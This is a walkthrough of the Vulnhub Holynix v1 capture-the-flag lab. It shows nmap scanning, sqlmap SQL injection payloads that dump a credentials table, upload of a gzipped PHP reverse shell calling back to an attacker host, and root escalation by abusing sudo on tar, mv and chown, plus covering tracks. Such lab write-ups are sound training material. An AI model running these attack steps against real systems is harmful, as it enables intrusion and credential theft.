@@ -1,0 +1,505 @@
+.. include:: /pentest_links.txt
+
+.. _Holynix1:
+
+********
+Holynix1
+********
+
+Setup
+=====
+
+This is to document the meetup's efforts responding to the challenge `Vulnhub Holynix: v1 <https://www.vulnhub.com/entry/holynix-v1,20/>`_:
+
+  Holynix1 is an ubuntu server vmware image that was deliberately built to have security holes for the purposes of penetration testing. More of an obstacle course than a real world example. The object of the challenge is to gain root level privileges and access to personal client information.
+
+Setting up the VMware VM
+------------------------
+
+The VM comes packaged as `holynix-v1.tar.bz2 <http://download.vulnhub.com/holynix/holynix-v1.tar.bz2>`_, which is a tar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of :file:`/etc/shadow`, and delete the root password hash. This will provide passwordless access to holynix1 via root.
+
+See :ref:`VMSetup` for background on using the VMware vmdk file. Holynix1 is Ubuntu 8.04, x86, and 512MB memory.  Here's how you can create a backing store to undo any changes to the disk:
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  VM=holynix1
+  BACKING=$VM.vmdk
+  VM_DISK=$VM-changes.qcow2
+  curl --remote-name http://download.vulnhub.com/holynix/holynix-v1.tar.bz2
+  tar xvfj holynix-v1.tar.bz2
+  cd holynix
+  $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+  $SUDO qemu-img info $BACKING
+  $SUDO qemu-img info $VM_DISK
+  # To revert to original image
+  # $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+
+Then Linux KVM could use the VM_DISK to create the holynix1 VM. The actual command the author used in Debian Linux to create the VM was:
+
+.. code-block:: bash
+
+  VM=holynix1
+  $SUDO virt-install \
+      --name "$VM" --cpu host --vcpus 1 --ram 512 \
+      --os-type=linux --os-variant=ubuntuhardy \
+      --disk path=$VM_DISK \
+      --noautoconsole \
+      --accelerate --hvm \
+      --import
+  #    --console pty,target_type=virtio \
+  # Useful commands:
+  # $SUDO virsh help
+  # $SUDO virsh list --all
+  # $SUDO virsh destroy --graceful $VM
+  # $SUDO virsh start $VM
+  # $SUDO virsh reboot $VM
+  # $SUDO virsh shutdown $VM
+  # $SUDO virsh undefine [--wipe-storage] $VM
+  # $SUDO virsh undefine $VM
+  # $SUDO virsh help destroy
+  # 
+
+So if holynix1 were running and you wanted to "start over again":
+
+.. code-block:: bash
+
+  $SUDO virsh shutdown $VM
+  $SUDO virsh undefine $VM
+  $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+  $SUDO virt-install \
+      --name "$VM" --cpu host --vcpus 1 --ram 512 \
+      --os-type=linux --os-variant=ubuntuhardy \
+      --disk path=$VM_DISK \
+      --noautoconsole \
+      --accelerate --hvm \
+      --import
+
+
+
+
+Reconnaisance
+=============
+
+Directory setup
+---------------
+
+We'll refer to the following directories below:
+
+.. code-block:: bash
+
+  BASE=$HOME/local/pentest
+  LOCATION=$BASE/phouse
+  JOB=$LOCATION/holynix1
+  TOOLS=exploit,nmap,sqlmap
+  eval mkdir -p $JOB/{$TOOLS}
+
+
+
+Basic network reconnaisance
+---------------------------
+
+Start with some standard network reconnaisance looking for the vulnerable host:
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  cd $JOB/nmap
+  NMOUT=nmap
+  SN='192.168.1.0/24'
+  TARGETS=targets.txt
+  $SUDO nmap -sn -PE -oA ${NMOUT}_sn $SN
+  $SUDO chown $USER.$USER ${NMOUT}_sn.*
+  # use the grep-able output to get a list of target hosts
+  grep Up ${NMOUT}_sn.gnmap | cut -d" " -f2 > $TARGETS
+  # use the xml output to get an html report
+  xsltproc ${NMOUT}_sn.xml -o ${NMOUT}_sn.html
+
+Running this gives us:
+
+.. code-block:: console
+
+  hacker@kali:~$ BASE=$HOME/local/pentest
+  hacker@kali:~$ LOCATION=$BASE/phouse
+  hacker@kali:~$ JOB=$LOCATION/holynix1
+  hacker@kali:~$ TOOLS=exploit,nmap,sqlmap
+  hacker@kali:~$ eval mkdir -p $JOB/{$TOOLS}
+  hacker@kali:~$ SUDO=$(which sudo)
+  hacker@kali:~$ [[ "$USER" == "root" ]] && SUDO=
+  hacker@kali:~$ cd $JOB/nmap
+  hacker@kali:~/local/pentest/phouse/holynix1/nmap$ NMOUT=nmap
+  hacker@kali:~/local/pentest/phouse/holynix1/nmap$ SN='192.168.1.0/24'
+  hacker@kali:~/local/pentest/phouse/holynix1/nmap$ TARGETS=targets.txt
+  hacker@kali:~/local/pentest/phouse/holynix1/nmap$ $SUDO nmap -sn -PE -oA ${NMOUT}_sn $SN
+  ###################### SNIP ######################
+  Nmap scan report for 192.168.1.105
+  Host is up (0.00056s latency).
+  MAC Address: 52:54:00:2B:88:8E (QEMU Virtual NIC)
+  ###################### SNIP ######################
+  hacker@kali:~/local/pentest/phouse/holynix1/nmap$ $SUDO chown $USER.$USER ${NMOUT}_sn.*
+  hacker@kali:~/local/pentest/phouse/holynix1/nmap$ # use the grep-able output to get a list of target hosts
+  hacker@kali:~/local/pentest/phouse/holynix1/nmap$ grep Up ${NMOUT}_sn.gnmap | cut -d" " -f2 > $TARGETS
+  hacker@kali:~/local/pentest/phouse/holynix1/nmap$ # use the xml output to get an html report
+  hacker@kali:~/local/pentest/phouse/holynix1/nmap$ xsltproc ${NMOUT}_sn.xml -o ${NMOUT}_sn.html
+
+
+At this point we have $TARGETS so scan them:
+
+.. code-block:: bash
+
+  $SUDO nmap -A -vv -T3 --max-retries 0 -Pn -iL $TARGETS -oA ${NMOUT}_A
+  $SUDO chown $USER.$USER ${NMOUT}_A.*
+  xsltproc ${NMOUT}_A.xml -o ${NMOUT}_A.html
+
+Running this gives us:
+
+.. code-block:: console
+  :emphasize-lines: 1
+
+  hacker@kali:~/local/pentest/phouse/holynix1/nmap$ $SUDO nmap -A -vv -T3 --max-retries 0 -Pn -iL $TARGETS -oA ${NMOUT}_A
+  ###################### SNIP ######################
+  Discovered open port 80/tcp on 192.168.1.105
+  ###################### SNIP ######################
+  ###################### SNIP ######################
+  PORT   STATE SERVICE VERSION
+  80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
+  |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+  |_http-title: Site doesn't have a title (text/html).
+  ###################### SNIP ######################
+  OS details: Linux 2.6.24 - 2.6.25
+  ###################### SNIP ######################
+  hacker@kali:~/local/pentest/phouse/holynix1/nmap$ $SUDO chown $USER.$USER ${NMOUT}_A.*
+  hacker@kali:~/local/pentest/phouse/holynix1/nmap$ xsltproc ${NMOUT}_A.xml -o ${NMOUT}_A.html
+
+Our target holynix1 is T=192.168.1.105 and runs an Apache 2.2.8 web server at port 80 using PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch. `apache2 2.2.8-1ubuntu0.25 <https://bugs.launchpad.net/ubuntu/+source/apache2/2.2.8-1ubuntu0.25>`_ shows the package is part of Ubuntu hardy, as does `php5 5.2.4-2ubuntu5.12 (i386 binary) in ubuntu hardy <https://launchpad.net/ubuntu/hardy/i386/php5/5.2.4-2ubuntu5.12>`_.
+
+What's at port 80?
+------------------
+
+.. code-block:: bash
+
+  T=192.168.1.105
+  cd $JOB/exploit
+  # The main page shows a link to a login page
+  curl --silent http://$T/ | grep login
+  # The login page has a form
+  curl --silent http://$T/?page=login.php | sed -n '/<form /,/<\/form>/p'
+
+Running this we see:
+
+.. code-block:: console
+
+  hacker@kali:~/local/pentest/phouse/holynix1/nmap$ T=192.168.1.105
+  hacker@kali:~/local/pentest/phouse/holynix1/nmap$ cd $JOB/exploit
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ # The main page shows a link to a login page
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ curl --silent http://$T/ | grep login
+		  <a href='?page=login.php'>Login</a><br />		<hr>
+  <center><h3>You must login to access restricted content</h3></center>
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ # The login page has a form
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ curl --silent http://$T/?page=login.php | sed -n '/<form /,/<\/form>/p'
+  <form method="POST" action="/index.php?page=login.php">	<p>Enter your username and password:</p>
+	  <p>Name:<br><input type="text" name="user_name" size="20"></p>
+	  <p>Password:<br><input type="password" name="password" size="20"></p>
+	  <p><input type="submit" value="Submit" name="Submit_button"></p>
+  </form>
+
+
+So we see a login form and fire up :program:`sqlmap`.
+
+:program:`sqlmap` to get creds
+------------------------------
+
+.. code-block:: bash
+
+  cd $JOB/sqlmap
+  URL="http://$T/?page=login.php"
+  sqlmap -u "$URL" --random-agent --batch \
+         --forms --dbs \
+         --output-dir $PWD/sqlmap_login
+
+.. code-block:: console
+  :emphasize-lines: 1-5,26-41
+
+  hacker@kali:~/local/pentest/phouse/holynix1/sqlmap$ cd $JOB/sqlmap
+  hacker@kali:~/local/pentest/phouse/holynix1/sqlmap$ URL="http://$T/?page=login.php"
+  hacker@kali:~/local/pentest/phouse/holynix1/sqlmap$ sqlmap -u "$URL" --random-agent --batch \
+  >        --forms --dbs \
+  >        --output-dir $PWD/sqlmap_login
+  ###################### SNIP ######################
+  sqlmap identified the following injection points with a total of 409 HTTP(s) requests:
+  ---
+  Parameter: password (POST)
+      Type: boolean-based blind
+      Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+      Payload: user_name=PyHK&password=-1374' OR 3977=3977#&Submit_button=Submit
+
+      Type: error-based
+      Title: MySQL OR error-based - WHERE or HAVING clause
+      Payload: user_name=PyHK&password=-3444' OR 1 GROUP BY CONCAT(0x71717a7a71,(SELECT (CASE WHEN (9623=9623) THEN 1 ELSE 0 END)),0x7171787171,FLOOR(RAND(0)*2)) HAVING MIN(0)#&Submit_button=Submit
+
+      Type: AND/OR time-based blind
+      Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)
+      Payload: user_name=PyHK&password=' AND (SELECT * FROM (SELECT(SLEEP(5)))taqW)#&Submit_button=Submit
+
+      Type: UNION query
+      Title: MySQL UNION query (NULL) - 4 columns
+      Payload: user_name=PyHK&password=' UNION ALL SELECT CONCAT(0x71717a7a71,0x6c4b6e4c4a42474e6377,0x7171787171),NULL,NULL,NULL#&Submit_button=Submit
+  ---
+  do you want to exploit this SQL injection? [Y/n] Y
+  [18:51:28] [INFO] the back-end DBMS is MySQL
+  web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+  web application technology: PHP 5.2.4, Apache 2.2.8
+  back-end DBMS: MySQL 5.0.12
+  [18:51:28] [INFO] fetching database names
+  [18:51:28] [INFO] the SQL query used returns 4 entries
+  [18:51:28] [INFO] retrieved: information_schema
+  [18:51:28] [INFO] retrieved: clients
+  [18:51:28] [INFO] retrieved: creds
+  [18:51:28] [INFO] retrieved: mysql
+  available databases [4]:                                                      
+  [*] clients
+  [*] creds
+  [*] information_schema
+  [*] mysql
+  ###################### SNIP ######################
+
+Pursuing the creds database we find the accounts table:
+
+.. code-block:: bash
+
+  sqlmap -u "$URL" --random-agent --batch \
+         --forms --dbs --dbms=MySQL -D creds --tables \
+         --output-dir $PWD/sqlmap_login
+
+Here are the tables found:
+
++-------------+
+| table       |
++=============+
+| accounts    |
++-------------+
+| blogs_table |
++-------------+
+| calender    |
++-------------+
+| employee    |
++-------------+
+| page        |
++-------------+
+
+
+And looking at the accounts table:
+
+.. code-block:: console
+
+  sqlmap -u "$URL" --random-agent --batch \
+         --forms --dbs --dbms=MySQL -D creds -T accounts --dump \
+         --output-dir $PWD/sqlmap_login
+
+
+====== ======== ============ =======================
+  cid   upload   username     password
+====== ======== ============ =======================
+  1     0        alamo        Ih@cK3dM1cR05oF7
+  2     1        etenenbaum   P3n7@g0n0wN3d
+  3     1        gmckinnon    d15cL0suR3Pr0J3c7
+  4     1        hreiser      Ik1Ll3dNiN@r315er
+  5     1        jdraper      p1@yIngW17hPh0n35
+  6     1        jjames       @rR35t3D%40716
+  7     1        jljohansen   m@k1nGb0o7L3g5
+  8     1        kpoulsen     wH@7ar37H3Fed5D01n
+  9     0        ltorvalds    f@7H3r0FL1nUX
+  10    1        mrbutler     n@5aHaSw0rM5
+  11    1        rtmorris     Myd@d51N7h3NSA
+====== ======== ============ =======================
+
+The Exploit
+===========
+
+What can we do with credentials?
+--------------------------------
+
+At this point we can explore the server choosing a user with upload rights: rtmorris with password "Myd@d51N7h3NSA". It doesn't take long to notice a form to upload files to the home directory. Here we show the ``curl`` equivalent to logging on and looking at the upload form.
+
+.. code-block:: bash
+  :emphasize-lines: 1-
+
+  T=192.168.1.105
+  cd $JOB/exploit
+  # Login using curl
+  COOKIES=cookies.txt
+  USER_NAME=rtmorris
+  PASSWORD=Myd@d51N7h3NSA
+  URL_LOGIN=http://$T/index.php?page=login.php
+  curl --silent --cookie-jar $COOKIES \
+       --form user_name="$USER_NAME" \
+       --form password="$PASSWORD" \
+       --form Submit_button="Submit" \
+       $URL_LOGIN
+  cat cookies.txt
+
+  # Look at the upload form
+  curl --silent --cookie $COOKIES http://$T/index.php?page=upload.php | \
+      sed -n '/<form /,/<\/form>/p;/<\/form>/q'
+
+Running the above gives:
+
+.. code-block:: console
+  :emphasize-lines: 19,22-
+
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ T=192.168.1.105
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ cd $JOB/exploit
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ # Login using curl
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ COOKIES=cookies.txt
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ USER_NAME=rtmorris
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ PASSWORD=Myd@d51N7h3NSA
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ URL_LOGIN=http://$T/index.php?page=login.php
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ curl --silent --cookie-jar $COOKIES \
+  >      --form user_name="$USER_NAME" \
+  >      --form password="$PASSWORD" \
+  >      --form Submit_button="Submit" \
+  >      $URL_LOGIN
+  ###################### SNIP ######################
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ cat cookies.txt
+  # Netscape HTTP Cookie File
+  # http://curl.haxx.se/rfc/cookie_spec.html
+  # This file was generated by libcurl! Edit at your own risk.
+
+  192.168.1.105	FALSE	/	FALSE	0	uid	11
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ 
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ # Look at the upload form
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ curl --silent --cookie $COOKIES http://$T/index.php?page=upload.php | \
+  >     sed -n '/<form /,/<\/form>/p;/<\/form>/q'
+  <h3>Home Directory Uploader</h3><form enctype='multipart/form-data' action='index.php?page=transfer.php' method='POST'>Please choose a file: <input name='uploaded' type='file' /><br /><input type='checkbox' name='autoextract' value='true' /> Enable the automatic extraction of gzip archives.<br><input type='submit' value='Upload' /></form>
+
+Upload a PHP reverse shell
+--------------------------
+
+Using the upload form, run the following to upload a PHP reverse shell. Note that a straight upload (without taking advantage of gzip) won't have the right privs to execute, so you must upload a gzip'ed file:
+
+.. code-block:: bash
+  :emphasize-lines: 1-2,7,12-
+
+  ATTACKER=192.168.1.28
+  # Upload a php reverse shell
+  RSHELL=$(locate php | grep reverse | tail --lines=1)
+  UPLOAD=rshell.php
+  UPLOADTGZ=rshell.tar.gz
+  cp $RSHELL $UPLOAD
+  # Modify reverse shell to connect to ATTACKER
+  sed -i "s/\$ip = '127.0.0.1'/\$ip = '$ATTACKER'/" $UPLOAD
+  sed -i "s/\$port = 1234/\$port = 9999/" $UPLOAD
+  tar -cvzf $UPLOADTGZ $UPLOAD
+  URL_UPLOAD=http://$T/index.php?page=transfer.php
+  curl --silent --cookie $COOKIES \
+       --form uploaded="@$UPLOADTGZ;type=application/gzip" \
+       --form autoextract="true" \
+       --form submit="Upload" \
+       $URL_UPLOAD | grep "has been uploaded"
+  # The uploaded shell is at http://$T/~rtmorris/rshell.php
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-2,7,12-
+
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ ATTACKER=192.168.1.28
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ # Upload a php reverse shell
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ RSHELL=$(locate php | grep reverse | tail --lines=1)
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ UPLOAD=rshell.php
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ UPLOADTGZ=rshell.tar.gz
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ cp $RSHELL $UPLOAD
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ # Modify reverse shell to connect to ATTACKER
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ sed -i "s/\$ip = '127.0.0.1'/\$ip = '$ATTACKER'/" $UPLOAD
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ sed -i "s/\$port = 1234/\$port = 9999/" $UPLOAD
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ tar -cvzf $UPLOADTGZ $UPLOAD
+  rshell.php
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ URL_UPLOAD=http://$T/index.php?page=transfer.php
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ curl --silent --cookie $COOKIES \
+  >      --form uploaded="@$UPLOADTGZ;type=application/gzip" \
+  >      --form autoextract="true" \
+  >      --form submit="Upload" \
+  >      $URL_UPLOAD | grep "has been uploaded"
+  <h3>The file 'rshell.tar.gz' has been uploaded.</h3><br />The ownership of the uploaded file(s) have been changed accordingly.<br /><a href='?page=upload.php' >Back to upload page</a>
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ # The uploaded shell is at http://$T/~rtmorris/rshell.php
+
+Get root via the reverse shell
+------------------------------
+
+In a different window on your attacking host run:
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  socat - tcp-listen:9999
+
+Return to the window you've been doing your exploits from to trigger the shell by running:
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  curl --silent --cookie $COOKIES http://$T/~$USER_NAME/$UPLOAD
+
+This will kick off the reverse shell in the ``socat`` window from user www-data without a tty. First get a tty (not required but good practice) and see if we have any ``sudo`` karma:
+
+.. code-block:: console
+  :emphasize-lines: 1,4-
+
+  hacker@kali:~/local/pentest/phouse/holynix1/exploit$ socat - tcp-listen:9999
+  Linux holynix 2.6.24-26-server #1 SMP Tue Dec 1 19:19:20 UTC 2009 i686 GNU/Linux
+  ###################### SNIP ######################
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  /bin/sh: can't access tty; job control turned off
+  $ python -c 'import pty; pty.spawn("/bin/bash")'
+  www-data@holynix:/$ sudo -l
+  sudo -l
+  User www-data may run the following commands on this host:
+      (root) NOPASSWD: /bin/chown
+      (root) NOPASSWD: /bin/chgrp
+      (root) NOPASSWD: /bin/tar
+      (root) NOPASSWD: /bin/mv
+
+Here's the key thing: ``chown``, ``chgrp``, and ``mv`` rights allow you to replace system executables. Here ``tar`` isn't needed so you can replace it with ``bash`` and :file:`/etc/sudoers` lets www-data ``sudo /bin/tar`` without a password:
+
+.. code-block:: console
+  :emphasize-lines: 1,3,5,7,9,11-13
+
+  www-data@holynix:/$ cp /bin/bash /tmp
+  cp /bin/bash /tmp
+  www-data@holynix:/$ sudo /bin/chown root.root /tmp/bash
+  sudo /bin/chown root.root /tmp/bash
+  www-data@holynix:/$ sudo mv /bin/tar /bin/tar.orig
+  sudo mv /bin/tar /bin/tar.orig
+  www-data@holynix:/$ sudo mv /tmp/bash /bin/tar
+  sudo mv /tmp/bash /bin/tar
+  www-data@holynix:/$ sudo /bin/tar
+  sudo /bin/tar
+  root@holynix:/# id
+  id
+  uid=0(root) gid=0(root) groups=0(root)
+
+And we have root and can cover much of our tracks by deleting :file:`rshell.php` and ``mv /bin/tar.orig /bin/tar``.
+
+A good writeup showing this approach can be found at `Holynix Hacking Challenge: Part 1 <http://blog.techorganic.com/2012/04/07/holynix-hacking-challenge-part-1/>`_.
+
+Get root via other ways
+-----------------------
+
+Another approach is to temporarily update :file:`/etc/sudoers` allowing www-data unlimited sudo rights. Picking up from just getting a shell:
+
+.. code-block:: bash
+
+  python -c 'import pty; pty.spawn("/bin/bash")'
+  sudo /bin/tar -cvpPf /tmp/sudoers.tar /etc/sudoers
+  echo "root ALL=(ALL) ALL" > /tmp/sudoers
+  echo "%www-data ALL=(ALL) NOPASSWD: ALL" >> /tmp/sudoers
+  chmod 440 /tmp/sudoers
+  sudo /bin/chown root.root /tmp/sudoers
+  sudo /bin/mv /tmp/sudoers /etc/sudoers
+  sudo su -
+  /bin/tar -xvpPf /tmp/sudoers.tar
+
+Another illustrative approach is `Holynix - Level 1 <https://blog.g0tmi1k.com/2011/08/holynix-level-1/>`_. While being much more complex and longer, it illustrates some useful techniques: running Tamper Data, DirBuster, accessing the MySQL database, cloning the users KnockKnock port knocking profile, and exploiting the ChangeTrack service.
+
